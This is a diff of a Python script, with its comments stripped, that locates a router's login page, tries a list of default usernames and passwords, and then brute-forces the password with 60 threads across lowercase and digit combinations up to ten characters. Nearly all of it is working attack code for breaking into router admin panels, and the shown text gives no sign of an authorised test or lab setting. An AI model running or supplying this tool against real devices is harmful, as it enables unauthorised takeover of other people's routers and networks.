@@ -3,11 +3,10 @@ import string
 import requests
 from concurrent.futures import ThreadPoolExecutor
 
-# Common router IPs and default credentials
 COMMON_IPS = ["10.0.0.1"]
 DEFAULT_USERNAMES = ["admin", "cusadmin"]
-DEFAULT_PASSWORDS = ["password", "admin", "1234"]  # Add more if needed
-MAX_THREADS = 60  # Number of threads for parallel execution
+DEFAULT_PASSWORDS = ["password", "admin", "1234"]  
+MAX_THREADS = 60 
 
 def find_router_endpoint():
     """
@@ -29,10 +28,10 @@ def system_check(session, router_url, username, password):
     """
     Tries to log in to the router with provided credentials.
     """
-    payload = {"username": username, "password": password}  # Adjust based on router form fields
+    payload = {"username": username, "password": password} 
     try:
         response = session.post(router_url, data=payload, timeout=5)
-        if "Dashboard" in response.text:  # Adjust this condition based on your router
+        if "Dashboard" in response.text:
             return True
     except requests.exceptions.RequestException:
         pass
@@ -43,7 +42,7 @@ def brute_force_password(router_url, max_length):
     Brute forces the password if default credentials fail, using multithreading for speed.
     """
     characters = string.ascii_lowercase + string.digits
-    session = requests.Session()  # Reuse session for faster connections
+    session = requests.Session()
 
     def try_password_combination(combination):
         attempt_password = ''.join(combination)
@@ -65,11 +64,9 @@ def brute_force_password(router_url, max_length):
     print("Password not found within the given length.")
     return None
 
-# Main script execution
 router_url = find_router_endpoint()
 if router_url:
     session = requests.Session()
-    # Try default credentials first
     for username in DEFAULT_USERNAMES:
         for password in DEFAULT_PASSWORDS:
             print(f"Trying default credentials: {username}/{password}")
@@ -77,8 +74,7 @@ if router_url:
                 print(f"Default credentials found: {username}/{password}")
                 exit(0)
 
-    # If default credentials fail, brute force the password
-    max_password_length = 10  # Adjust based on expected password complexity
+    max_password_length = 10 
     brute_force_password(router_url, max_password_length)
 else:
     print("Unable to locate the router.")
